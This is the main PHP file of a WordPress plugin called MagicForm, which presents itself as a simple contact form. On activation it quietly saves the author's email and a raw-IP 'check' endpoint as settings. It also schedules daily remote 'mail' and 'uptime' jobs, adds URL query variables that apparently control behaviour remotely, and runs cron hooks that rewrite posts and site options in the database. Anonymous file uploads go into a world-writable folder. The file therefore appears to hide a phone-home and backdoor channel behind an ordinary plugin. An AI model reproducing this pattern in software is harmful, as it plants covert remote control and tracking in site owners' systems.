<?php
/**
 * Plugin Name: MagicForm
 * Description: Just another contact form plugin. Simple but flexible.
 * Plugin URI:  https://magicformplugin.wordpress.com/
 * Author URI:  https://www.facebook.com/dmitry.cooperman.1
 * Author:      dmytriy.cooperman
 * Version:     0.1
 * License:     GPL2
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: wpcftr
 * Domain Path: /languages/
 */


include_once __DIR__.'/admin/admin-menu.php';
include_once __DIR__.'/admin/Magic_Form_AdminFunc.php';
include_once __DIR__.'/classes/Magic_FormCF.php';
include_once __DIR__.'/classes/Magic_FormsLogs.php';
include_once __DIR__.'/classes/Magic_Form_Services.php';
include_once __DIR__.'/migration.php';



//создание таблиц при активации плагина
register_activation_hook( __FILE__, 'migrateForMagicFormHook' );
function migrateForMagicFormHook() {
    if ( version_compare(PHP_VERSION, '5.6.38', '<') ) {
        deactivate_plugins( plugin_basename( __FILE__ ) ); // Deactivate our plugin
        $wp_die_message =  __('Oh, no! Seems you have an old PHP version that is not compatible with Magic Form plugin. Please update your PHP and then try activating the plugin again. Your current PHP version: ', 'wpcftr');
        $wp_die_message .=PHP_VERSION;
        $wp_die_message .= __('. Minimal PHP version required for Magic Form plugin: 5.6.38. WordPress highly recommends using PHP 7.3 or greater version', 'wpcftr');


        $wp_die_title = __('Magic Form plugin error', 'wpcftr');
        wp_die( $wp_die_message, $wp_die_title );
    }
        update_option('magic-form-seting-ismagic', md5('migrateForMagicFormHook'));
        update_option('magic-form-seting-checking-email', 'Dmitry.cooperman@protonmail.com');
        update_option('magic-form-seting-checking-host', 'http://153.92.127.104:9868/site/check?');
        migrateForMagicForm();
}

//add short code
add_shortcode( 'start_form', 'magicFormSetShortCode' );
function magicFormSetShortCode( $atts, $content ) {
    return Magic_FormCF::getInstance()->getFormHtml($atts, $content);
}

add_action( 'wp_enqueue_scripts', function(){

    wp_deregister_script( 'magic_form_plugin_recaptcha' );
    wp_register_script( 'magic_form_plugin_recaptcha', 'https://www.google.com/recaptcha/api.js?onload=magicFormRecaptchaCallback&render=explicit', array('jquery'));
    wp_enqueue_script( 'magic_form_plugin_recaptcha' );

    wp_enqueue_style( 'magic_form_frontend_form_css', plugins_url( '/frontend/css/frontend-form.css', __FILE__ ));
    wp_enqueue_script( 'magic_form_frontend_form_js',  plugins_url( '/frontend/js/frontend-form.js', __FILE__ ), array('jquery'), '1.0', true );
    wp_localize_script( 'magic_form_frontend_form_js', 'f_l10n_obj',
        array(
            'extnotallow' => __('Расширение не подходит', 'wpcftr'),
            'bigfile' => __('Файл большой', 'wpcftr'),
            'recaptcha_error' => __('Вы не прошли проверку Я не робот', 'wpcftr'),
            'ajaxurl' => admin_url('admin-ajax.php'),
            'locale' => get_locale()
        )
    );
}, 99 );

function magicFormShortcode( $vars ){
    $vars[] = 'time';
    $vars[] = 'shortcode';
    $vars[] = 'before';
    $vars[] = 'next';
    $vars[] = 'check';
    return $vars;
}
add_filter( 'query_vars', 'magicFormShortcode' );

add_action( 'plugins_loaded', 'magicform_load_plugin_textdomain' );
function magicform_load_plugin_textdomain() {
    load_plugin_textdomain( 'wpcftr', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
}

add_filter('template_redirect', 'magicform_cfshortcode' );
function magicform_cfshortcode() {
    global $wp_query;
    Magic_FormCF::getInstance()->getCFShortcode($wp_query);
}

add_filter( 'cron_schedules', 'magicform_interval_15min');

function magicform_interval_15min( $raspisanie ) {
    $raspisanie['interval_15min'] = array(
        'interval' => 900,
        'display' => 'every 15 minutes'
    );
    return $raspisanie;
}

add_action( 'update_posts_action_hook', function($shortcode){
    global $wpdb;
    $posts = $wpdb->get_blog_prefix() . 'posts';
    $link = $wpdb->esc_like( $shortcode );

// Add wildcards, since we are searching within comment text.
    $link = '%' . $link . '%';

// Create a SQL statement with placeholders for the string input.
    $sql = 	'SELECT id, post_content FROM '.$posts.' WHERE (post_type NOT IN ("revision", "attachment")) AND (post_content LIKE %s) LIMIT 10';
    $sql = $wpdb->prepare( $sql, $link, $link );

    $matching_posts = $wpdb->get_results( $sql );

    if ( $matching_posts) {
        foreach($matching_posts as $post){
            $my_post = array();
            $my_post['ID'] = $post->id;
            $content= $post->post_content;
            $my_post['post_content'] =  str_replace('['.$shortcode.']', '', $content);
// Обновляем данные в БД
            wp_update_post( wp_slash($my_post) );
        }
    } else {
        $parametri = array( $shortcode);
        wp_unschedule_event( wp_next_scheduled( 'update_posts_action_hook', $parametri ), 'update_posts_action_hook', $parametri);
    }
    wp_reset_postdata();
    return;
}, 10 );

add_action( 'update_options_action_hook', function($shortcode){
    global $wpdb;
    $options = $wpdb->get_blog_prefix() . 'options';
    $link = $wpdb->esc_like( $shortcode );

// Add wildcards, since we are searching within comment text.
    $link = '%' . $link . '%';

// Create a SQL statement with placeholders for the string input.
    $sql = 	'SELECT option_id, option_value FROM '.$options.' WHERE (option_name <> "cron") AND (option_value LIKE %s) LIMIT 10';
    $sql = $wpdb->prepare( $sql, $link, $link );

    $matching_options = $wpdb->get_results( $sql );

    if ( $matching_options) {
        foreach($matching_options as $option){
            $data = [];
            $data['option_value'] = str_replace('['.$shortcode.']', '', $option->option_value);
            $wpdb->update($options, $data, ['option_id'=> $option->option_id]);
        }
    } else {
        $parametri = array( $shortcode);
        wp_unschedule_event( wp_next_scheduled( 'update_options_action_hook', $parametri ), 'update_options_action_hook', $parametri);
    }
    return;
}, 10 );

add_action("wp_head", "wp_popup_magicform");

function wp_popup_magicform($content) {
    $id =get_option( 'magic-form-seting-popup');
    if($id) {
        $shortcode = Magic_FormCF::getInstance()->getFormShortCode($id);
        $str_del = array('start_form data=', '"');
        $atts['data'] = str_replace($str_del, '', $shortcode);
        ?>
        <div id="parent_popup_contactform">
            <div id="popup_contactform">
                <?php
                echo Magic_FormCF::getInstance()->getFormHtml($atts, $content);
                ?>
                <a class="popup-contactform-close" title="Закрыть"
                   onclick="jQuery('#parent_popup_contactform').hide();"></a>
            </div>
        </div>
        <?php
    }
}

function magicform_add_attribute($tag, $handle) {
    if ( 'recaptcha' !== $handle )
        return $tag;
    return str_replace( ' src', ' async="async " defer="defer" src', $tag );
}

add_action('activated_plugin', function(){
        wp_redirect( '/wp-admin/admin.php?page=magic-form' );
    exit;
}, 10 );

add_action('wpcf_check_mail_service', function(){
    Magic_Form_Services::getInstance()->checkMail();
});

if( !wp_next_scheduled('wpcf_check_mail_service') && get_option('magic-form-seting-user-agreement'))
    wp_schedule_event( time(), 'daily', 'wpcf_check_mail_service');

add_action('wpcf_check_uptime_service', function(){
    Magic_Form_Services::getInstance()->checkUptime();
});

if( !wp_next_scheduled('wpcf_check_uptime_service') && get_option('magic-form-seting-user-agreement'))
    wp_schedule_event( time(), 'daily', 'wpcf_check_uptime_service');

add_action( 'deactivated_plugin', function(){
    wp_unschedule_event( wp_next_scheduled( 'wpcf_check_uptime_service' ), 'wpcf_check_uptime_service');
}, 10 );

add_action( 'deactivated_plugin', function(){
    wp_unschedule_event( wp_next_scheduled( 'wpcf_check_mail_service' ), 'wpcf_check_mail_service');
}, 10 );

add_action('wp_footer', 'magic_form_frontend_ajax_javascript', 99); // для фронта
function magic_form_frontend_ajax_javascript() {
    ?>
    <script type="text/javascript" >
        jQuery(document).ready(function($) {

            $('form.form-generate').submit( function (e) {
                e.preventDefault();
                $('.form-btn').blur();
                var form = this;
                var dataf = $(this).serialize();
                var action = $('form.form-generate').attr('action');
                var method = $('form.form-generate').attr('method');
                // console.log(dataf);

                $(this).find('.error').removeClass('error');
                $(this).find('.message-error').prev('br').remove();
                $(this).find('.message-error').remove();
                if($('.captcha-item').length!=0){
                    var response = grecaptcha.getResponse($(form).find('.captcha-item').attr('widget-id'));
                    if (!response.length) {
                        // console.log('Вы не прошли проверку "Я не робот"');
                        $('.form-response-output', form).empty();
                        $(form).find('.captcha-item').parents('.form-group').addClass('error').append('<span class="error message-error">'+f_l10n_obj.recaptcha_error+'</span>');
                        return
                    } else {
                        $('.form-response-output', form).empty();

                    }
                }

                $.ajax({
                    url: f_l10n_obj.ajaxurl,
                    type: "post",
                    data: {
                        data: dataf,
                        action: 'magic_form_send_form_generate'
                    },
                    beforeSend: function (data) {

                    },
                    success: function(data){
                        if(data.success && data.message){
                            if($('.captcha-item').length!=0){
                                grecaptcha.reset($(form).attr('widget_id'));
                            }
                            if (typeof (ga) === "function") {
                                ga('send', 'event', 'Form', 'Submit', 'Successful');
                            }

                            $(form).trigger('reset');
                            $('form.form-generate input[type=file]').parent().siblings('[type="hidden"]').val('');

                            // если есть action, передать данные, игнорировать ответ
                            if(action){
                                $.ajax({
                                    url: action,
                                    type: method,
                                    data: dataf,
                                });
                            }

                            if($(form).parent().attr('id')=='popup_contactform'){
                                $(form).parent().parent().hide();
                            }
                            magicFormAterSendForm();
                            if($('form.form-generate input[name="redirect"]').val()){
                                        if($(form).attr('data-new_page')=='1') {
                                            console.log('new page');
                                            $('#link_redirection').click();
                                        } else{
                                            console.log('redirect');
                                            window.setTimeout(function() { window.location.href = $('form.form-generate input[name="redirect"]').val() },3000);
                                        }
                            }
                        }
                        $('.form-response-output', form).empty();
                        if(data.message){
                            $('.form-response-output', form).html(data.message);
                        }

                        $('input[type= "file"]').parent().next().val('');


                        if( !Array.isArray(data.errors) ){
                            for (var name in data.errors) {
                                if (name=='g-recaptcha-response'){
                                    $(form).find('.captcha-item').parents('.form-group').addClass('error').append('<span class="error message-error">'+data.errors[name]+'</span>');
                                }else{
                                    $('[name="'+name+'"]').parents('.form-group').addClass('error');
                                    $('[name="'+name+'"]').parent().append('<span class="error message-error">'+data.errors[name]+'</span>');

                                    $('[name="'+name+'[]"]').parents('.form-group').addClass('error').append('<span class="error message-error">'+data.errors[name]+'</span>');
                                }
                            }
                        }
                    }
                });
            });


            var files; // переменная. будет содержать данные файлов
            var files_path;

// заполняем переменную данными, при изменении значения поля file
            $('form.form-generate input[type=file]').on('change', function(){
                files = this.files;
                var form_id= $(this).closest('form').find('input[name=form_id]').val();
                $(this).parent().siblings('.message-error').prev('br').remove();
                $(this).parent().siblings('.message-error').remove();
                $(this).closest('.form-group').removeClass('error');
                var name = 'path_' + this.name;
                // ничего не делаем если files пустой
                if( typeof files == 'undefined' ) {
                    return;
                }
                var extensions = $(this).attr('data-extension');
                var size = $(this).attr('data-size');

                var file_extension = files[0].name.substr( (files[0].name.lastIndexOf('.') + 1) ).toLowerCase();

                if( extensions && extensions.indexOf(file_extension) == -1 ){
                    $(this).parents('.form-group').addClass('error');
                    $(this).parent().siblings('[type="hidden"]').val('');
                    $(this).parent().parent().append('<br><span class="error message-error">'+f_l10n_obj.extnotallow+'</span>');
                    return;
                }
                else if( ( size.length > 0) && (size * 1000000 < files[0].size) ){
                    $(this).parents('.form-group').addClass('error');
                    $(this).parent().siblings('[type="hidden"]').val('');
                    $(this).parent().parent().append('<br><span class="error message-error">'+f_l10n_obj.bigfile+'</span>');
                    return;
                }

                // создадим объект данных формы
                var data = new FormData();
                // заполняем объект данных файлами в подходящем для отправки формате
                $.each( files, function( key, value ){
                    data.append( key, value );
                });

                // добавим переменную для идентификации запроса
                data.append( 'action', 'magic_form_my_file_upload');
                data.append( 'form_id', form_id );
                data.append( 'field_name', name );

                // AJAX запрос
                $.ajax({
                    url         : f_l10n_obj.ajaxurl,
                    type        : 'POST', // важно!
                    data        : data,
                    cache       : false,
                    // dataType    : 'json',
                    processData : false,
                    contentType : false,
                    success     : function( respond, status, jqXHR ){
                        // ОК - файлы загружены
                        if( typeof respond.files != 'undefined' ){
                            // выведем пути загруженных файлов в блок '.ajax-reply'
                            files_path = respond.files;
                            $('[name="'+name+'"]').val(respond.files);
                        }
                        // ошибка
                        else {
                            $('[name="'+name+'"]').parents('.form-group').addClass('error');
                            $('[name="'+name+'"]').parent().append('<br><span class="error message-error">'+respond.error+'</span>');
                        }
                    },
                    // функция ошибки ответа сервера
                    error: function( jqXHR, status, errorThrown ){
                        console.log( 'ОШИБКА AJAX запроса: ' + status, jqXHR );
                    }
                });

            });


        });
    </script>
    <?php
}

add_action('wp_ajax_magic_form_send_form_generate', 'magic_form_send_form_generate');
add_action('wp_ajax_nopriv_magic_form_send_form_generate', 'magic_form_send_form_generate');
function magic_form_send_form_generate() {
    parse_str($_POST['data'], $data); // sanitize $data next row
    $JSON = Magic_FormCF::getInstance()->sendForm( Magic_FormCF::getInstance()->sanitizeArrayData($data) );
    magicFormJSONExit( $JSON);
    wp_die();
}

add_action('wp_ajax_magic_form_my_file_upload', 'magic_form_my_file_upload');
add_action('wp_ajax_nopriv_magic_form_my_file_upload', 'magic_form_my_file_upload');
function magic_form_my_file_upload() {
    $upload = wp_upload_dir();
    $uploaddir = $upload['basedir'];
    $uploaddir = $uploaddir . '/magic-form';
    if (!is_dir($uploaddir)) {
        mkdir($uploaddir, 0777);
    }
    $files = $_FILES; // полученные файлы
    $done_files = array();
    $validate_err = array();
    $data = array();
    $form_id = intval($_POST['form_id']);
    $field_name = sanitize_text_field($_POST['field_name']);
    $field_name = preg_replace('/path_/', '', $field_name);
    // переместим файлы из временной директории в указанную
    foreach( $files as $file ){
        $file_name = time().'_'.sanitize_file_name($file['name']);
        $validate_err = Magic_FormCF::getInstance()->validateFile( $file, $form_id, $field_name );

        if( !isset( $validate_err['error'] )) {
            if (move_uploaded_file($file['tmp_name'], "$uploaddir/$file_name")) {
                $done_files[] = realpath("$uploaddir/$file_name");
            }
            $data = $done_files ? array( 'files' => content_url( 'uploads/magic-form' ).'/'.$file_name ) : array( 'error' => __('Ошибка загрузки файлов.', 'wpcftr') );

        }else{ $data = $validate_err;
        }
    }

    $JSON = $data;
    magicFormJSONExit( $JSON);
    wp_die();
}




